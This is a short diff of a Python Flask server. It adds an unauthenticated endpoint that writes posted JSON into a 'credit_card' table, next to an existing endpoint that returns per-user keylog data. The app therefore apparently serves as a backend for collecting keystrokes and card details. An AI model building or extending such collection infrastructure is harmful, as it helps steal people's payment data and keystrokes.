@@ -83,6 +83,25 @@ def createORupdate():
     }
     return jsonify(success)
 
+# Endpoint for creating/updating payments
+@app.route('/create_update_payments', methods=['POST'])
+def updatePayments():
+    # For posting form data to DB
+    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+    resultSet = connObj.NewInsert('credit_card', data)
+    print resultSet
+    # print resultSet
+    if resultSet == 'error':
+        error = {
+            "message": "Error"
+        }
+        return jsonify(error)
+
+    success = {
+        "message": "Payment updated successfully lalalallalalaalaala !"
+    }
+    return jsonify(success)
+
 # Endpoint to fetch keylog data
 @app.route('/getKeylogData/<user_id>', methods = ['GET'])
 def getKeyLogs(user_id):
